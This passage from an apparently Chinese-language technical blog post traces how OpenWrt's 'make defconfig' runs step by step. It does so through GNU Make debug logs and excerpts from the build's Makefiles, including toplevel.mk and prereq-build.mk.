0x7fffcb0a1b70 PID 16422 Removing child 0x7fffcb0a1b70 PID 16422 from chain.  Successfully remade target file &#39;scripts/config/conf&#39;.  Considering target file &#39;prepare-tmpinfo&#39;.   File &#39;prepare-tmpinfo&#39; does not exist.    Considering target file &#39;FORCE&#39;.     File &#39;FORCE&#39; does not exist.     Finished prerequisites of target file &#39;FORCE&#39;.    Must remake target &#39;FORCE&#39;.    Successfully remade target file &#39;FORCE&#39;.   Finished prerequisites of target file &#39;prepare-tmpinfo&#39;.  Must remake target &#39;prepare-tmpinfo&#39;.Putting child 0x7fffcb0a2010 (prepare-tmpinfo) PID 16454 on the chain.Live child 0x7fffcb0a2010 (prepare-tmpinfo) PID 16454 GNU Make 4.2.1Built for x86_64-pc-linux-gnuCopyright (C) 1988-2016 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.Reading makefiles...Reading makefile &#39;Makefile&#39;...Reading makefile &#39;/home/litreily/openwrt/include/debug.mk&#39; (search path) (no ~ expansion)...Reading makefile &#39;/home/litreily/openwrt/include/depends.mk&#39; (search path) (no ~ expansion)...Reading makefile &#39;/home/litreily/openwrt/include/toplevel.mk&#39; (search path) (no ~ expansion)...Reading makefile &#39;/home/litreily/openwrt/include/verbose.mk&#39; (search path) (no ~ expansion)...Updating makefiles.... Considering target file &#39;/home/litreily/openwrt/include/verbose.mk&#39;.  Looking for an implicit rule for &#39;/home/litreily/openwrt/include/verbose.mk&#39;.  Trying pattern rule with stem &#39;verbose.mk&#39;.  Found an implicit rule for &#39;/home/litreily/openwrt/include/verbose.mk&#39;.  Finished prerequisites of target file &#39;/home/litreily/openwrt/include/verbose.mk&#39;. No need to remake target &#39;/home/litreily/openwrt/include/verbose.mk&#39;. Considering target file &#39;/home/litreily/openwrt/include/toplevel.mk&#39;.  Looking for an implicit rule for &#39;/home/litreily/openwrt/include/toplevel.mk&#39;.  Trying pattern rule with stem &#39;toplevel.mk&#39;.  Found an implicit rule for &#39;/home/litreily/openwrt/include/toplevel.mk&#39;.  Finished prerequisites of target file &#39;/home/litreily/openwrt/include/toplevel.mk&#39;. No need to remake target &#39;/home/litreily/openwrt/include/toplevel.mk&#39;. Considering target file &#39;/home/litreily/openwrt/include/depends.mk&#39;.  Looking for an implicit rule for &#39;/home/litreily/openwrt/include/depends.mk&#39;.  Trying pattern rule with stem &#39;depends.mk&#39;.  Found an implicit rule for &#39;/home/litreily/openwrt/include/depends.mk&#39;.  Finished prerequisites of target file &#39;/home/litreily/openwrt/include/depends.mk&#39;. No need to remake target &#39;/home/litreily/openwrt/include/depends.mk&#39;. Considering target file &#39;/home/litreily/openwrt/include/debug.mk&#39;.  Looking for an implicit rule for &#39;/home/litreily/openwrt/include/debug.mk&#39;.  Trying pattern rule with stem &#39;debug.mk&#39;.  Found an implicit rule for &#39;/home/litreily/openwrt/include/debug.mk&#39;.  Finished prerequisites of target file &#39;/home/litreily/openwrt/include/debug.mk&#39;. No need to remake target &#39;/home/litreily/openwrt/include/debug.mk&#39;. Considering target file &#39;Makefile&#39;.  Looking for an implicit rule for &#39;Makefile&#39;.  Trying pattern rule with stem &#39;Makefile&#39;.  Found an implicit rule for &#39;Makefile&#39;.  Finished prerequisites of target file &#39;Makefile&#39;. No need to remake target &#39;Makefile&#39;.Updating goal targets....Considering target file &#39;staging_dir/host/.prereq-build&#39;.  Considering target file &#39;include/prereq-build.mk&#39;.   Looking for an implicit rule for &#39;include/prereq-build.mk&#39;.   Trying pattern rule with stem &#39;prereq-build.mk&#39;.   Found an implicit rule for &#39;include/prereq-build.mk&#39;.   Finished prerequisites of target file &#39;include/prereq-build.mk&#39;.  No need to remake target &#39;include/prereq-build.mk&#39;. Finished prerequisites of target file &#39;staging_dir/host/.prereq-build&#39;. Prerequisite &#39;include/prereq-build.mk&#39; is older than target &#39;staging_dir/host/.prereq-build&#39;.No need to remake target &#39;staging_dir/host/.prereq-build&#39;.Reaping winning child 0x7fffcb0a2010 PID 16454 Live child 0x7fffcb0a2010 (prepare-tmpinfo) PID 16505 Reaping winning child 0x7fffcb0a2010 PID 16505 Live child 0x7fffcb0a2010 (prepare-tmpinfo) PID 16506 Collecting package info: package/base-filesCollecting package info: package/boot/arm-trusted-firmware-mvebuCollecting package info: package/boot/arm-trusted-firmware-rockchipCollecting package info: package/boot/arm-trusted-firmware-sunxiCollecting package info: package/boot/at91bootstrapCollecting package info: package/boot/fconfigCollecting package info: package/boot/grub2Collecting package info: package/boot/imx-bootletsCollecting package info: package/boot/kexec-toolsCollecting package info: package/boot/kobs-ngCollecting package info: package/boot/mt7623n-preloaderCollecting package info: package/boot/tfa-layerscapeCollecting package info: package/boot/uboot-at91Collecting package info: package/boot/uboot-envtoolsCollecting package info: package/boot/uboot-fritz4040Collecting package info: package/boot/uboot-imx6Collecting package info: package/boot/uboot-kirkwoodCollecting package info: package/boot/uboot-lantiqCollecting package info: package/boot/uboot-layerscapeCollecting package info: package/boot/uboot-mediatekCollecting package info: package/boot/uboot-mvebuCollecting package info: package/boot/uboot-mxsCollecting package info: package/boot/uboot-omapCollecting package info: package/boot/uboot-oxnasCollecting package info: package/boot/uboot-ramipsCollecting package info: package/boot/uboot-rockchipCollecting package info: package/boot/uboot-sunxiCollecting package info: package/boot/uboot-tegraCollecting package info: package/boot/uboot-zynqCollecting package info: package/devel/binutilsCollecting package info: package/devel/gdbCollecting package info: package/devel/perfCollecting package info: package/devel/straceCollecting package info: package/devel/trace-cmdCollecting package info: package/devel/valgrindCollecting package info: package/firmware/amd64-microcodeCollecting package info: package/firmware/ath10k-ct-firmwareCollecting package info: package/firmware/b43legacy-firmwareCollecting package info: package/firmware/cypress-firmwareCollecting package info: package/firmware/cypress-nvramCollecting package info: package/firmware/intel-microcodeCollecting package info: package/firmware/ipq-wifiCollecting package info: package/firmware/lantiq/dsl-vrx200-firmware-xdslCollecting package info: package/firmware/layerscape/fman-ucodeCollecting package info: package/firmware/layerscape/ls-dplCollecting package info: package/firmware/layerscape/ls-mcCollecting package info: package/firmware/layerscape/ls-rcwCollecting package info: package/firmware/layerscape/ppfe-firmwareCollecting package info: package/firmware/linux-firmwareCollecting package info: package/firmware/prism54-firmwareCollecting package info: package/firmware/wireless-regdbCollecting package info: package/kernel/acx-mac80211Collecting package info: package/kernel/ath10k-ctCollecting package info: package/kernel/bcm27xx-gpu-fwCollecting package info: package/kernel/bcm63xx-cfeCollecting package info: package/kernel/broadcom-wlCollecting package info: package/kernel/button-hotplugCollecting package info: package/kernel/cryptodev-linuxCollecting package info: package/kernel/exfatCollecting package info: package/kernel/gpio-button-hotplugCollecting package info: package/kernel/gpio-nct5104dCollecting package info: package/kernel/hwmon-gscCollecting package info: package/kernel/lantiq/ltq-adslCollecting package info: package/kernel/lantiq/ltq-adsl-fwCollecting package info: package/kernel/lantiq/ltq-adsl-meiCollecting package info: package/kernel/lantiq/ltq-atmCollecting package info: package/kernel/lantiq/ltq-deuCollecting package info: package/kernel/lantiq/ltq-ifxosCollecting package info: package/kernel/lantiq/ltq-ptmCollecting package info: package/kernel/lantiq/ltq-tapiCollecting package info: package/kernel/lantiq/ltq-vdslCollecting package info: package/kernel/lantiq/ltq-vdsl-fwCollecting package info: package/kernel/lantiq/ltq-vdsl-meiCollecting package info: package/kernel/lantiq/ltq-vmmcCollecting package info: package/kernel/linuxCollecting package info: package/kernel/mac80211Collecting package info: package/kernel/mt76Collecting package info: package/kernel/mt7621-qtn-rgmiiCollecting package info: package/kernel/mwlwifiCollecting package info: package/kernel/nat46Collecting package info: package/kernel/om-watchdogCollecting package info: package/kernel/rtc-rv5c386aCollecting package info: package/kernel/rtl8812au-ctCollecting package info: package/kernel/trelayCollecting package info: package/libs/argp-standaloneCollecting package info: package/libs/elfutilsCollecting package info: package/libs/gettextCollecting package info: package/libs/gettext-fullCollecting package info: package/libs/gmpCollecting package info: package/libs/janssonCollecting package info: package/libs/libauditCollecting package info: package/libs/libbsdCollecting package info: package/libs/libevent2Collecting package info: package/libs/libiconvCollecting package info: package/libs/libiconv-fullCollecting package info: package/libs/libjson-cCollecting package info: package/libs/libmnlCollecting package info: package/libs/libnetfilter-conntrackCollecting package info: package/libs/libnfnetlinkCollecting package info: package/libs/libnftnlCollecting package info: package/libs/libnlCollecting package info: package/libs/libnl-tinyCollecting package info: package/libs/libpcapCollecting package info: package/libs/libselinuxCollecting package info: package/libs/libsemanageCollecting package info: package/libs/libsepolCollecting package info: package/libs/libtoolCollecting package info: package/libs/libuboxCollecting package info: package/libs/libunwindCollecting package info: package/libs/libusbCollecting package info: package/libs/mbedtlsCollecting package info: package/libs/musl-ftsCollecting package info: package/libs/ncursesCollecting package info: package/libs/nettleCollecting package info: package/libs/opensslCollecting package info: package/libs/pcreCollecting package info: package/libs/poptCollecting package info: package/libs/readlineCollecting package info: package/libs/sysfsutilsCollecting package info: package/libs/toolchainCollecting package info: package/libs/uclibc++Collecting package info: package/libs/uclientCollecting package info: package/libs/ustream-sslCollecting package info: package/libs/wolfsslCollecting package info: package/libs/zlibCollecting package info: package/network/config/firewallCollecting package info: package/network/config/greCollecting package info: package/network/config/ipipCollecting package info: package/network/config/ltq-adsl-appCollecting package info: package/network/config/ltq-vdsl-appCollecting package info: package/network/config/netifdCollecting package info: package/network/config/qos-scriptsCollecting package info: package/network/config/soloscliCollecting package info: package/network/config/swconfigCollecting package info: package/network/config/vtiCollecting package info: package/network/config/vxlanCollecting package info: package/network/config/xfrmCollecting package info: package/network/ipv6/464xlatCollecting package info: package/network/ipv6/6in4Collecting package info: package/network/ipv6/6rdCollecting package info: package/network/ipv6/6to4Collecting package info: package/network/ipv6/ds-liteCollecting package info: package/network/ipv6/mapCollecting package info: package/network/ipv6/odhcp6cCollecting package info: package/network/ipv6/thc-ipv6Collecting package info: package/network/services/dnsmasqCollecting package info: package/network/services/dropbearCollecting package info: package/network/services/eadCollecting package info: package/network/services/hostapdCollecting package info: package/network/services/igmpproxyCollecting package info: package/network/services/ipset-dnsCollecting package info: package/network/services/lldpdCollecting package info: package/network/services/odhcpdCollecting package info: package/network/services/omcproxyCollecting package info: package/network/services/pppCollecting package info: package/network/services/relaydCollecting package info: package/network/services/uhttpdCollecting package info: package/network/services/umdnsCollecting package info: package/network/services/wireguardCollecting package info: package/network/utils/adb-enablemodemCollecting package info: package/network/utils/arptablesCollecting package info: package/network/utils/bpftoolsCollecting package info: package/network/utils/comgtCollecting package info: package/network/utils/danteCollecting package info: package/network/utils/ebtablesCollecting package info: package/network/utils/ethtoolCollecting package info: package/network/utils/iperfCollecting package info: package/network/utils/iperf3Collecting package info: package/network/utils/iproute2Collecting package info: package/network/utils/ipsetCollecting package info: package/network/utils/iptablesCollecting package info: package/network/utils/iwCollecting package info: package/network/utils/iwcapCollecting package info: package/network/utils/iwinfoCollecting package info: package/network/utils/layerscape/restoolCollecting package info: package/network/utils/linux-atmCollecting package info: package/network/utils/ltq-dsl-baseCollecting package info: package/network/utils/maccalcCollecting package info: package/network/utils/nftablesCollecting package info: package/network/utils/owipcalcCollecting package info: package/network/utils/resolveipCollecting package info: package/network/utils/rssiledsCollecting package info: package/network/utils/tcpdumpCollecting package info: package/network/utils/umbimCollecting package info: package/network/utils/uqmiCollecting package info: package/network/utils/wireguard-toolsCollecting package info: package/network/utils/wireless-toolsCollecting package info: package/network/utils/wpan-toolsCollecting package info: package/network/utils/wwanCollecting package info: package/system/ca-certificatesCollecting package info: package/system/fstoolsCollecting package info: package/system/fwtoolCollecting package info: package/system/iucode-toolCollecting package info: package/system/mtdCollecting package info: package/system/openwrt-keyringCollecting package info: package/system/opkgCollecting package info: package/system/procdCollecting package info: package/system/refpolicyCollecting package info: package/system/rpcdCollecting package info: package/system/selinux-policyCollecting package info: package/system/uboxCollecting package info: package/system/ubusCollecting package info: package/system/ucertCollecting package info: package/system/uciCollecting package info: package/system/urandom-seedCollecting package info: package/system/urngdCollecting package info: package/system/usignCollecting package info: package/system/zram-swapCollecting package info: package/utils/adbCollecting package info: package/utils/bcm27xx-userlandCollecting package info: package/utils/bsdiffCollecting package info: package/utils/busyboxCollecting package info: package/utils/bzip2Collecting package info: package/utils/checkpolicyCollecting package info: package/utils/ct-bugcheckCollecting package info: package/utils/e2fsprogsCollecting package info: package/utils/f2fs-toolsCollecting package info: package/utils/fbtestCollecting package info: package/utils/fritz-toolsCollecting package info: package/utils/jboot-toolsCollecting package info: package/utils/jsonfilterCollecting package info: package/utils/luaCollecting package info: package/utils/lua5.3Collecting package info: package/utils/mdadmCollecting package info: package/utils/mtd-utilsCollecting package info: package/utils/nvramCollecting package info: package/utils/osafeloaderCollecting package info: package/utils/oseamaCollecting package info: package/utils/otrxCollecting package info: package/utils/policycoreutilsCollecting package info: package/utils/px5g-mbedtlsCollecting package info: package/utils/px5g-wolfsslCollecting package info: package/utils/ravpower-mcuCollecting package info: package/utils/secilcCollecting package info: package/utils/spidev_testCollecting package info: package/utils/ugpsCollecting package info: package/utils/usbmodeCollecting package info: package/utils/usbresetCollecting package info: package/utils/usbutilsCollecting package info: package/utils/util-linuxCollecting package info: merging...Collecting package info: doneReaping winning child 0x7fffcb0a2010 PID 16506 Live child 0x7fffcb0a2010 (prepare-tmpinfo) PID 18058 Collecting target info: target/linux/apm821xxCollecting target info: target/linux/arc770Collecting target info: target/linux/archs38Collecting target info: target/linux/armvirtCollecting target info: target/linux/at91Collecting target info: target/linux/ath25Collecting target info: target/linux/ath79Collecting target info: target/linux/bcm27xxCollecting target info: target/linux/bcm47xxCollecting target info: target/linux/bcm53xxCollecting target info: target/linux/bcm63xxCollecting target info: target/linux/geminiCollecting target info: target/linux/imx6Collecting target info: target/linux/ipq40xxCollecting target info: target/linux/ipq806xCollecting target info: target/linux/ipq807xCollecting target info: target/linux/kirkwoodCollecting target info: target/linux/lantiqCollecting target info: target/linux/layerscapeCollecting target info: target/linux/maltaCollecting target info: target/linux/mediatekCollecting target info: target/linux/mpc85xxCollecting target info: target/linux/mvebuCollecting target info: target/linux/mxsCollecting target info: target/linux/octeonCollecting target info: target/linux/octeontxCollecting target info: target/linux/omapCollecting target info: target/linux/oxnasCollecting target info: target/linux/pistachioCollecting target info: target/linux/ramipsCollecting target info: target/linux/realtekCollecting target info: target/linux/rockchipCollecting target info: target/linux/sunxiCollecting target info: target/linux/tegraCollecting target info: target/linux/umlCollecting target info: target/linux/x86Collecting target info: target/linux/zynqCollecting target info: merging...Collecting target info: doneReaping winning child 0x7fffcb0a2010 PID 18058 Live child 0x7fffcb0a2010 (prepare-tmpinfo) PID 20209 Reaping winning child 0x7fffcb0a2010 PID 20209 Live child 0x7fffcb0a2010 (prepare-tmpinfo) PID 20212 Reaping winning child 0x7fffcb0a2010 PID 20212 Live child 0x7fffcb0a2010 (prepare-tmpinfo) PID 20217 WARNING: Makefile &#39;package/utils/busybox/Makefile&#39; has a dependency on &#39;libpam&#39;, which does not existWARNING: Makefile &#39;package/utils/busybox/Makefile&#39; has a dependency on &#39;libpam&#39;, which does not existWARNING: Makefile &#39;package/utils/busybox/Makefile&#39; has a build dependency on &#39;libpam&#39;, which does not existWARNING: Makefile &#39;package/boot/kexec-tools/Makefile&#39; has a dependency on &#39;liblzma&#39;, which does not existWARNING: Makefile &#39;package/network/services/lldpd/Makefile&#39; has a dependency on &#39;libnetsnmp&#39;, which does not existWARNING: Makefile &#39;package/utils/policycoreutils/Makefile&#39; has a dependency on &#39;libpam&#39;, which does not existWARNING: Makefile &#39;package/utils/policycoreutils/Makefile&#39; has a dependency on &#39;libpam&#39;, which does not existWARNING: Makefile &#39;package/utils/policycoreutils/Makefile&#39; has a build dependency on &#39;libpam&#39;, which does not existReaping winning child 0x7fffcb0a2010 PID 20217 Live child 0x7fffcb0a2010 (prepare-tmpinfo) PID 20219 Reaping winning child 0x7fffcb0a2010 PID 20219 Live child 0x7fffcb0a2010 (prepare-tmpinfo) PID 20221 Reaping winning child 0x7fffcb0a2010 PID 20221 Live child 0x7fffcb0a2010 (prepare-tmpinfo) PID 20223 Reaping winning child 0x7fffcb0a2010 PID 20223 Removing child 0x7fffcb0a2010 PID 20223 from chain.  Successfully remade target file &#39;prepare-tmpinfo&#39;.  Pruning file &#39;FORCE&#39;. Finished prerequisites of target file &#39;defconfig&#39;.Must remake target &#39;defconfig&#39;.touch .configPutting child 0x7fffcb096b50 (defconfig) PID 20227 on the chain.Live child 0x7fffcb096b50 (defconfig) PID 20227 Reaping winning child 0x7fffcb096b50 PID 20227 Live child 0x7fffcb096b50 (defconfig) PID 20228 Reaping winning child 0x7fffcb096b50 PID 20228 [ -L .config ] &amp;&amp; export KCONFIG_OVERWRITECONFIG=1; \    scripts/config/conf  --defconfig=.config Config.inLive child 0x7fffcb096b50 (defconfig) PID 20229 ## configuration written to .config#Reaping winning child 0x7fffcb096b50 PID 20229 Removing child 0x7fffcb096b50 PID 20229 from chain.Successfully remade target file &#39;defconfig&#39;.</code></pre><p>从以上 log 信息中可以非常完整清楚的看到 make 指令的执行流程，其中包含了每个目标文件及其依赖文件的规则查找和执行。下面我们结合 log 以及 Makefile 来详细追踪一下 <code>make defconfig</code> 的执行流程。</p><p>首先要知道 make 的目标文件是<code>defconfig</code>, 对应 toplevel.mk 中的</p><pre><code class="makefile">defconfig: scripts/config/conf prepare-tmpinfo FORCE    touch .config    @if [ ! -s .config -a -e $(HOME)/.openwrt/defconfig ]; then cp $(HOME)/.openwrt/defconfig .config; fi    [ -L .config ] &amp;&amp; export KCONFIG_OVERWRITECONFIG=1; \        $&lt; $(KCONF_FLAGS) --defconfig=.config Config.in</code></pre><p>可以知道其依赖项包含3个：</p><ol><li>scripts/config/conf</li><li>prepare-tmpinfo</li><li>FORCE</li></ol><h3 id="script-config-conf"><a href="#script-config-conf" class="headerlink" title="script/config/conf"></a>script/config/conf</h3><p>对于依赖文件 <code>scripts/config/conf</code> ，make 执行log如下：</p><pre><code class="log">Considering target file &#39;defconfig&#39;. File &#39;defconfig&#39; does not exist.  Considering target file &#39;scripts/config/conf&#39;.   File &#39;scripts/config/conf&#39; does not exist.   Looking for an implicit rule for &#39;scripts/config/conf&#39;.   Trying pattern rule with stem &#39;c&#39;.   Found an implicit rule for &#39;scripts/config/conf&#39;.    Considering target file &#39;staging_dir/host/.prereq-build&#39;.     File &#39;staging_dir/host/.prereq-build&#39; does not exist.      Considering target file &#39;include/prereq-build.mk&#39;.       Looking for an implicit rule for &#39;include/prereq-build.mk&#39;.       Trying pattern rule with stem &#39;prereq-build.mk&#39;.       Found an implicit rule for &#39;include/prereq-build.mk&#39;.       Finished prerequisites of target file &#39;include/prereq-build.mk&#39;.      No need to remake target &#39;include/prereq-build.mk&#39;.     Finished prerequisites of target file &#39;staging_dir/host/.prereq-build&#39;.    Must remake target &#39;staging_dir/host/.prereq-build&#39;.</code></pre><p>make 首先查找 <code>defconfig</code> 是否需要更新，发现不存在，因为本身就不是文件。然后查找第一个依赖 <code>scripts/config/conf</code> ，发现也不存在，然后去查找生成这个文件的规则，在 <code>toplevel.mk</code> 可以找到其规则如下：</p><pre><code class="makefile">ifeq ($(FORCE),)  .config scripts/config/conf scripts/config/mconf: staging_dir/host/.prereq-buildendif</code></pre><p>其中 <code>$(FORCE)</code> 变量默认是个空值，所以条件满足，make 发现 conf 又依赖于 <code>staging_dir/host/.prereq-build</code>. 于是把 <code>.prereq-build</code> 当做新的目标，查找其规则，在 toplevel.mk 中如下：</p><pre><code class="makefile">staging_dir/host/.prereq-build: include/prereq-build.mk    mkdir -p tmp    @$(_SINGLE)$(NO_TRACE_MAKE) -j1 -r -s -f $(TOPDIR)/include/prereq-build.mk prereq 2&gt;/dev/null || &#123; \        echo &quot;Prerequisite check failed. Use FORCE=1 to override.&quot;; \        false; \    &#125;  ifneq ($(realpath $(TOPDIR)/include/prepare.mk),)    @$(_SINGLE)$(NO_TRACE_MAKE) -j1 -r -s -f $(TOPDIR)/include/prepare.mk prepare 2&gt;/dev/null || &#123; \        echo &quot;Preparation failed.&quot;; \        false; \    &#125;  endif    touch $@</code></pre><p>这里发现需要依赖 <code>include/prereq-build.mk</code> ，于是将该文件导入，并结束了对 <code>.prereq-build</code> 的依赖查找，同时标记需要重新生成目标 <code>staging_dir/host/.prereq-build</code>.</p><pre><code class="log">     Finished prerequisites of target file &#39;staging_dir/host/.prereq-build&#39;.    Must remake target &#39;staging_dir/host/.prereq-build&#39;.</code></pre><p>生成目标时，根据 Makefile 中 <code>.prereq-build</code> 规则，会执行以下指令:</p><pre><code class="makefile">    mkdir -p tmp    @$(_SINGLE)$(NO_TRACE_MAKE) -j1 -r -s -f $(TOPDIR)/include/prereq-build.mk prereq 2&gt;/dev/null || &#123; \        echo &quot;Prerequisite check failed. Use FORCE=1 to override.&quot;; \        false; \    &#125;    touch $@</code></pre><blockquote><p>include 目录不包含文件 <code>prepare.mk</code>, 所以原先的的判断可以忽略。</p></blockquote><p>使用 <code>make -n defconfig</code> 可以看到以上指令解析后是这样的</p><pre><code class="bash">mkdir -p tmpexport MAKEFLAGS= ;make V=s -j1 -r -s -f /home/litreily/openwrt/include/prereq-build.mk prereq 2&gt;/dev/null || &#123; \    echo &quot;Prerequisite check failed. Use FORCE=1 to override.&quot;; \    false; \&#125;touch staging_dir/host/.prereq-build</code></pre><p>以上 make 指令会根据 <code>prereq-build.mk</code> 和 <code>prereq.mk</code> 两个 Makefile 安装一些依赖工具。</p><pre><code class="makefile"># Required for the toolchain$(eval $(call TestHostCommand,working-make, \    Please install GNU make v3.82 or later. (This version has bugs), \    $(MAKE) -v | grep -E &#39;Make (3\.8[2-9]|3\.9[0-9]|[4-9]\.)&#39;))$(eval $(call TestHostCommand,case-sensitive-fs, \    OpenWrt can only be built on a case-sensitive filesystem, \    rm -f $(TMP_DIR)/test.*; touch $(TMP_DIR)/test.fs; \        test ! -f $(TMP_DIR)/test.FS))$(eval $(call TestHostCommand,proper-umask, \    Please build with umask 022 - other values produce broken packages, \    umask | grep -xE 0?0[012][012]))# ...</code></pre><p>其中的 <code>TestHostCommand</code> 定义于 <code>prereq.mk</code>. 对应的log如下，完整log参考前文。</p><pre><code class="log">Putting child 0x7fffcb0a1800 (staging_dir/host/.prereq-build) PID 15999 on the chain.Live child 0x7fffcb0a1800 (staging_dir/host/.prereq-build) PID 15999 Reaping winning child 0x7fffcb0a1800 PID 15999 Live child 0x7fffcb0a1800 (staging_dir/host/.prereq-build) PID 16000 Checking &#39;working-make&#39;... ok.Checking &#39;case-sensitive-fs&#39;... ok.Checking &#39;proper-umask&#39;... ok.Checking &#39;gcc&#39;... ok.Checking &#39;working-gcc&#39;... ok.Checking &#39;g++&#39;... ok.Checking &#39;working-g++&#39;... ok....Checking &#39;file&#39;... ok.Checking &#39;rsync&#39;... ok.Checking &#39;ldconfig-stub&#39;... ok.Reaping winning child 0x7fffcb0a1800 PID 16000 Live child 0x7fffcb0a1800 (staging_dir/host/.prereq-build) PID 16418 Reaping winning child 0x7fffcb0a1800 PID 16418 Removing child 0x7fffcb0a1800 PID 16418 from chain.    Successfully remade target file &#39;staging_dir/host/.prereq-build&#39;.   Finished prerequisites of target file &#39;scripts/config/conf&#39;.  Must remake target &#39;scripts/config/conf&#39;.</code></pre><p>执行完 <code>prereq-build.mk</code> 之后，就完成了 <code>scripts/config/conf</code> 依赖文件的编译生成，接下来就是正式编译 <code>conf</code> 文件了。</p><pre><code class="log">Putting child 0x7fffcb0a1b70 (scripts/config/conf) PID 16422 on the chain.Live child 0x7fffcb0a1b70 (scripts/config/conf) PID 16422 make[1]: Entering directory &#39;/home/litreily/openwrt/scripts/config&#39;cc -O2   -c -o conf.o conf.ccc -O2   -c -o confdata.o confdata.ccc -O2   -c -o expr.o expr.ccc -O2 -I ./.   -c -o lexer.lex.o lexer.lex.ccc -O2 -I ./.   -c -o parser.tab.o parser.tab.ccc -O2   -c -o preprocess.o preprocess.ccc -O2   -c -o symbol.o symbol.ccc -O2   -c -o util.o util.ccc   conf.o confdata.o expr.o lexer.lex.o parser.tab.o preprocess.o symbol.o util.o   -o confmake[1]: Leaving directory &#39;/home/litreily/openwrt/scripts/config&#39;Reaping winning child 0x7fffcb0a1b70 PID 16422 Removing child 0x7fffcb0a1b70 PID 16422 from chain.</code></pre><p>可以看出来，编译 <code>conf</code> 文件时，会在子进程中先进入对应的目录 <code>scripts/config</code> , 然后使用该目录的Makefile进行编译。编译结束后离开该目录并退出子进程。</p><p>至此，<code>defconfig</code> 的依赖文件 <code>scripts/config/conf</code> 就编译完成了。流程简述如下：</p><pre><code class="log">make defconfig    check prerequisites of defconfig :         scripts/config/conf, prepare-tmpinfo, FORCE        check prerequisites of scripts/config/conf:            staging_dir/host/.prereq-build            check prerequisites of staging_dir/host/.prereq-build                include/prereq-build.mk            finished prerequisites of staging_dir/host/.prereq-build            running commands in include/prereq-build.mk        finished prerequisites of scripts/config/conf        compiling scripts/config/conf        finished compile scripts/config/conf        ...</code></pre><h3 id="prepare-tmpinfo"><a href="#prepare-tmpinfo" class="headerlink" title="prepare-tmpinfo"></a>prepare-tmpinfo</h3><p><code>scripts/config/conf</code> 编译完成后，接下来就是<code>defconfig</code> 的第二个依赖 <code>prepare-tmpinfo</code> 了。</p><pre><code class="log">  Successfully remade target file &#39;scripts/config/conf&#39;.  Considering target file &#39;prepare-tmpinfo&#39;.   File &#39;prepare-tmpinfo&#39; does not exist.    Considering target file &#39;FORCE&#39;.     File &#39;FORCE&#39; does not exist.     Finished prerequisites of target file &#39;FORCE&#39;.    Must remake target &#39;FORCE&#39;.    Successfully remade target file &#39;FORCE&#39;.   Finished prerequisites of target file &#39;prepare-tmpinfo&#39;.  Must remake target &#39;prepare-tmpinfo&#39;.</code></pre><p>同样，查找 <code>prepare-tmpinfo</code> 目录不存在，查找其规则如下：</p><pre><code class="makefile">prepare-tmpinfo: FORCE    @+$(MAKE) -r -s staging_dir/host/.prereq-build $(PREP_MK)    mkdir -p tmp/info    $(_SINGLE)$(NO_TRACE_MAKE) -j1 -r -s -f include/scan.mk SCAN_TARGET=&quot;packageinfo&quot; SCAN_DIR=&quot;package&quot; SCAN_NAME=&quot;package&quot; SCAN_DEPTH=5 SCAN_EXTRA=&quot;&quot;    $(_SINGLE)$(NO_TRACE_MAKE) -j1 -r -s -f include/scan.mk SCAN_TARGET=&quot;targetinfo&quot; SCAN_DIR=&quot;target/linux&quot; SCAN_NAME=&quot;target&quot; SCAN_DEPTH=2 SCAN_EXTRA=&quot;&quot; SCAN_MAKEOPTS=&quot;TARGET_BUILD=1&quot;    for type in package target; do \        f=tmp/.$$&#123;type&#125;info; t=tmp/.config-$$&#123;type&#125;.in; \        [ &quot;$$t&quot; -nt &quot;$$f&quot; ] || ./scripts/$$&#123;type&#125;-metadata.pl $(_ignore) config &quot;$$f&quot; &gt; &quot;$$t&quot; || &#123; rm -f &quot;$$t&quot;; echo &quot;Failed to build $$t&quot;; false; break; &#125;; \    done    [ tmp/.config-feeds.in -nt tmp/.packageauxvars ] || ./scripts/feeds feed_config &gt; tmp/.config-feeds.in    ./scripts/package-metadata.pl mk tmp/.packageinfo &gt; tmp/.packagedeps || &#123; rm -f tmp/.packagedeps; false; &#125;    ./scripts/package-metadata.pl pkgaux tmp/.packageinfo &gt; tmp/.packageauxvars || &#123; rm -f tmp/.packageauxvars; false; &#125;    ./scripts/package-metadata.pl usergroup tmp/.packageinfo &gt; tmp/.packageusergroup || &#123; rm -f tmp/.packageusergroup; false; &#125;    touch $(TOPDIR)/tmp/.build</code></pre><p>其依赖 <code>FORCE</code> 不存在，log提示remade target file <code>FORCE</code>, 实际上应该啥也没做，我尝试 echo ${FORCE} 也是个空值。</p><p>按照以上指令，同样，通过 <code>make -n defconfig</code> 可以知晓对应指令如下：</p><pre><code class="bash">make -r -s staging_dir/host/.prereq-build OPENWRT_BUILD= QUIET=0mkdir -p tmpexport MAKEFLAGS= ;make V=s -j1 -r -s -f /home/litreily/openwrt/include/prereq-build.mk prereq 2&gt;/dev/null || &#123; \        echo &quot;Prerequisite check failed. Use FORCE=1 to override.&quot;; \        false; \&#125;touch staging_dir/host/.prereq-buildmkdir -p tmp/infoexport MAKEFLAGS= ;make V=s -j1 -r -s -f include/scan.mk SCAN_TARGET=&quot;packageinfo&quot; SCAN_DIR=&quot;package&quot; SCAN_NAME=&quot;package&quot; SCAN_DEPTH=5 SCAN_EXTRA=&quot;&quot;export MAKEFLAGS= ;make V=s -j1 -r -s -f include/scan.mk SCAN_TARGET=&quot;targetinfo&quot; SCAN_DIR=&quot;target/linux&quot; SCAN_NAME=&quot;target&quot; SCAN_DEPTH=2 SCAN_EXTRA=&quot;&quot; SCAN_MAKEOPTS=&quot;TARGET_BUILD=1&quot;for type in package target; do \    f=tmp/.$&#123;type&#125;info; t=tmp/.config-$&#123;type&#125;.in; \    [ &quot;$t&quot; -nt &quot;$f&quot; ] || ./scripts/$&#123;type&#125;-metadata.pl config &quot;$f&quot; &gt; &quot;$t&quot; || &#123; rm -f &quot;$t&quot;; echo &quot;Failed to build $t&quot;; false; break; &#125;; \done[ tmp/.config-feeds.in -nt tmp/.packageauxvars ] || ./scripts/feeds feed_config &gt; tmp/.config-feeds.in./scripts/package-metadata.pl mk tmp/.packageinfo &gt; tmp/.packagedeps || &#123; rm -f tmp/.packagedeps; false; &#125;./scripts/package-metadata.pl pkgaux tmp/.packageinfo &gt; tmp/.packageauxvars || &#123; rm -f tmp/.packageauxvars; false; &#125;./scripts/package-metadata.pl usergroup tmp/.packageinfo &gt; tmp/.packageusergroup || &#123; rm -f tmp/.packageusergroup; false; &#125;touch 